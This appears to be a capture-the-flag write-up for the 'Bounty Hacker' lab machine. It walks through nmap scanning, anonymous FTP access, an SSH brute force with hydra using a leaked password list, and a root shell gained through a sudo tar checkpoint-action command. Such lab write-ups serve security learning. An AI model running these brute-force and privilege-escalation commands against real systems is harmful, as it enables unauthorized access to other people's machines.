# Bounty Hacker

## Enumeration

> nmap -sCV -O -v <IP>
```
# Nmap 7.80 scan initiated Wed Nov 11 15:55:02 2020 as: nmap -sCV -O -v -oN nmap 10.10.225.190
Nmap scan report for 10.10.225.190
Host is up (0.56s latency).
Not shown: 967 filtered ports
PORT      STATE  SERVICE         VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp             vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.11.0
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp    open   http            Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
990/tcp   closed ftps
40193/tcp closed unknown
40911/tcp closed unknown
41511/tcp closed unknown
42510/tcp closed caerpc
44176/tcp closed unknown
44442/tcp closed coldfusion-auth
44443/tcp closed coldfusion-auth
44501/tcp closed unknown
45100/tcp closed unknown
48080/tcp closed unknown
49152/tcp closed unknown
49153/tcp closed unknown
49154/tcp closed unknown
49155/tcp closed unknown
49156/tcp closed unknown
49157/tcp closed unknown
49158/tcp closed unknown
49159/tcp closed unknown
49160/tcp closed unknown
49161/tcp closed unknown
49163/tcp closed unknown
49165/tcp closed unknown
49167/tcp closed unknown
49175/tcp closed unknown
49176/tcp closed unknown
49400/tcp closed compaqdiag
49999/tcp closed unknown
50000/tcp closed ibm-db2
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Infomir MAG-250 set-top box (89%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 40.271 days (since Fri Oct  2 10:27:02 2020)
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 11 15:56:51 2020 -- 1 IP address (1 host up) scanned in 109.03 seconds
```


## Exploit / User

port 21:

ftp 10.10.225.190

trying to login with default credentials:

> user : anonymous
> password :

it works

![image](https://user-images.githubusercontent.com/53917092/99078566-5a4cae00-259d-11eb-9ec9-84bbd5ddb14b.png)

so we download the files locks.txt and task.txt

![image](https://user-images.githubusercontent.com/53917092/99078658-85370200-259d-11eb-83a5-1968bfe1ef81.png)

![image](https://user-images.githubusercontent.com/53917092/99078717-997aff00-259d-11eb-97cf-92437bf3b326.png)

locks:
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
(this looks like a password list file)


task:
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
(now we know the system have a user named "lin")

using hydra to bruteforce ssh with user "lin" and the passwords from locks.txt

> hydra -l lin -P locks.txt ssh://10.10.225.190 -F

and we got the password

using this credentials we can login in ssh

loggin into ssh we have the user.txt

## Root

> sudo -l

```
User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```

checking GTFobins :

![image](https://user-images.githubusercontent.com/53917092/99079348-97fe0680-259e-11eb-8d8e-ef1d4a8ddadf.png)

we got the command:

> sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

and we are root :)

